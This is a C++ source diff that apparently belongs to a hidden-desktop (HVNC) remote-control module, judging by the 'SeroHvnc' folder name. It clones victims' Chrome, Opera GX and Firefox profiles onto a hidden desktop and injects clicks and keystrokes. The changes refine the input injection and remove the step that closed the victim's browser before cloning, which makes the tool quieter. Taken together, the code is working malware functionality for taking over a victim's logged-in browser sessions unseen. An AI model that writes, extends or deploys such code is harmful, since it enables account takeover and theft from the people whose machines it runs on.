@@ -1121,6 +1121,32 @@ static int RefineNCHit(int hit, HWND root, int x, int y) {
     return HTCAPTION;
 }
 
+static void send_physical_click(int x, int y, int button, bool down) {
+    int sw = GetSystemMetrics(SM_CXSCREEN);
+    int sh = GetSystemMetrics(SM_CYSCREEN);
+    if (sw <= 0) sw = 1920;
+    if (sh <= 0) sh = 1080;
+    int normX = (x * 65535) / sw;
+    int normY = (y * 65535) / sh;
+
+    INPUT input[2] = {0};
+    input[0].type = INPUT_MOUSE;
+    input[0].mi.dx = normX;
+    input[0].mi.dy = normY;
+    input[0].mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE;
+
+    input[1].type = INPUT_MOUSE;
+    input[1].mi.dx = normX;
+    input[1].mi.dy = normY;
+    DWORD flags = 0;
+    if (button == 0) flags = down ? MOUSEEVENTF_LEFTDOWN : MOUSEEVENTF_LEFTUP;
+    else if (button == 1) flags = down ? MOUSEEVENTF_RIGHTDOWN : MOUSEEVENTF_RIGHTUP;
+    else flags = down ? MOUSEEVENTF_MIDDLEDOWN : MOUSEEVENTF_MIDDLEUP;
+    input[1].mi.dwFlags = flags | MOUSEEVENTF_ABSOLUTE;
+
+    SendInput(2, input, sizeof(INPUT));
+}
+
 static void HandleMouseMove(int x, int y) {
     g_curX = x; g_curY = y;
     SetCursorPos(x, y);
@@ -1161,6 +1187,12 @@ static void HandleMouseButton(int x, int y, int button, bool down) {
     POINT pt = {x, y};
     HWND hwnd = SmartWindowFromPoint(pt);
     if (!hwnd) return;
+
+    string cls = WinClass(hwnd);
+    if (cls == "#32768") {
+        send_physical_click(x, y, button, down);
+        return;
+    }
 
     HWND root = GetAncestor(hwnd, GA_ROOT);
     if (!root) root = hwnd;
@@ -1225,7 +1257,6 @@ static void HandleMouseButton(int x, int y, int button, bool down) {
         }
     }
 
-    string cls = WinClass(hwnd);
     bool origIsUia = cls == "UIItemsView" || cls == "DirectUIHWND";
     bool isQt = cls.rfind("Qt5", 0) == 0 || cls.rfind("Qt6", 0) == 0 || cls.rfind("Qt4", 0) == 0;
     bool useSync = origIsUia || isQt;
@@ -1254,19 +1285,22 @@ static void HandleMouseButton(int x, int y, int button, bool down) {
                     DWORD_PTR dummy;
                     SendMessageTimeoutW(hwnd, WM_LBUTTONDOWN, MK_LBUTTON, lParam, SMTO_ABORTIFHUNG, 200, &dummy);
                     g_lbDownHwnd = hwnd;
-                    if (isDbl && origIsUia) {
+                    if (isDbl) {
                         SendMessageTimeoutW(hwnd, WM_LBUTTONDBLCLK, MK_LBUTTON, lParam, SMTO_ABORTIFHUNG, 200, &dummy);
                         UINT scanRet = MapVirtualKeyW(0x0D, 0);
                         PostMessageW(root, WM_KEYDOWN, 0x0D, (LPARAM)(1u | (scanRet << 16)));
                         PostMessageW(root, WM_KEYUP,   0x0D, (LPARAM)(0xC0000001u | (scanRet << 16)));
-                    } else if (isDbl) {
-                        SendMessageTimeoutW(hwnd, WM_LBUTTONDBLCLK, MK_LBUTTON, lParam, SMTO_ABORTIFHUNG, 200, &dummy);
                     }
                 } else {
                     PostMessageW(hwnd, WM_MOUSEMOVE, 0, lParam);
                     PostMessageW(hwnd, WM_LBUTTONDOWN, MK_LBUTTON, lParam);
                     g_lbDownHwnd = hwnd;
-                    if (isDbl) PostMessageW(hwnd, WM_LBUTTONDBLCLK, MK_LBUTTON, lParam);
+                    if (isDbl) {
+                        PostMessageW(hwnd, WM_LBUTTONDBLCLK, MK_LBUTTON, lParam);
+                        UINT scanRet = MapVirtualKeyW(0x0D, 0);
+                        PostMessageW(root, WM_KEYDOWN, 0x0D, (LPARAM)(1u | (scanRet << 16)));
+                        PostMessageW(root, WM_KEYUP,   0x0D, (LPARAM)(0xC0000001u | (scanRet << 16)));
+                    }
                 }
             } else {
                 HWND upTarget = (g_lbDownHwnd != NULL && g_lbDownHwnd != hwnd) ? g_lbDownHwnd : hwnd;
@@ -2254,7 +2288,7 @@ static void LaunchOnDesktop(string path, bool isRetry = false, bool cloneBrowser
         STARTUPINFOW si = { sizeof(si) };
         si.lpDesktop = deskPtr;
         si.dwFlags = STARTF_USEPOSITION | STARTF_USESHOWWINDOW;
-        si.wShowWindow = SW_SHOWMAXIMIZED;
+        si.wShowWindow = SW_SHOWNORMAL;
 
         string cmd = path;
         size_t exeEnd = path.find(".exe");
@@ -2274,24 +2308,23 @@ static void LaunchOnDesktop(string path, bool isRetry = false, bool cloneBrowser
             bool isOperaGX = (exeBase == "opera.exe" && path.find("Opera GX") != string::npos);
             if (isOperaGX) pidKey = "operagx.exe";
 
-            string hvncDirName = isOperaGX ? "operagx" : exeBase.substr(0, exeBase.find(".exe"));
+            size_t extIdx = exeBase.find(".exe");
+            string hvncDirName = isOperaGX ? "operagx" : (extIdx != string::npos ? exeBase.substr(0, extIdx) : exeBase);
             wchar_t tempPath[MAX_PATH];
             GetTempPathW(MAX_PATH, tempPath);
             fs::path hvncProfile = fs::path(tempPath) / L"SeroHvnc" / wstring(hvncDirName.begin(), hvncDirName.end());
 
-            wstring wRealProfile = isOperaGX ?
-                (wstring(GetEnvironmentVariableW(L"APPDATA", NULL, 0) ? L"" : L"")) :
-                GetChromiumRealProfile(wstring(exeBase.begin(), exeBase.end()));
-
-            if (isOperaGX) {
+            wstring wRealProfile = L"";
+            if (!isOperaGX) {
+                wRealProfile = GetChromiumRealProfile(wstring(exeBase.begin(), exeBase.end()));
+            } else {
                 wchar_t appData[MAX_PATH];
                 SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData);
                 wRealProfile = wstring(appData) + L"\\Opera Software\\Opera GX Stable";
             }
 
             if (cloneBrowser && !wRealProfile.empty() && fs::exists(wRealProfile)) {
-                KillProcessByName(exeBase);
-                std::this_thread::sleep_for(std::chrono::milliseconds(800));
+                std::this_thread::sleep_for(std::chrono::milliseconds(100));
                 try { if (fs::exists(hvncProfile)) fs::remove_all(hvncProfile); } catch (...) {}
                 CloneProfileWithProgress(wRealProfile, hvncProfile, "Cloning " + hvncDirName + "...");
             } else {
@@ -2336,7 +2369,11 @@ static void LaunchOnDesktop(string path, bool isRetry = false, bool cloneBrowser
                 // trim
                 size_t start = cmd.find_first_not_of(" \t\r\n");
                 size_t end = cmd.find_last_not_of(" \t\r\n");
-                if (start != string::npos && end != string::npos) cmd = cmd.substr(start, end - start + 1);
+                if (start != string::npos && end != string::npos) {
+                    cmd = cmd.substr(start, end - start + 1);
+                } else {
+                    cmd = "";
+                }
             }
 
             string hvncProfileStr = string(hvncProfile.wstring().begin(), hvncProfile.wstring().end());
@@ -2364,8 +2401,7 @@ static void LaunchOnDesktop(string path, bool isRetry = false, bool cloneBrowser
 
             wstring wRealProfile = GetFirefoxRealProfile();
             if (cloneBrowser && !wRealProfile.empty() && fs::exists(wRealProfile)) {
-                KillProcessByName("firefox.exe");
-                std::this_thread::sleep_for(std::chrono::milliseconds(800));
+                std::this_thread::sleep_for(std::chrono::milliseconds(100));
                 try { if (fs::exists(hvncProfile)) fs::remove_all(hvncProfile); } catch (...) {}
                 CloneProfileWithProgress(wRealProfile, hvncProfile, "Cloning firefox...");
             } else {
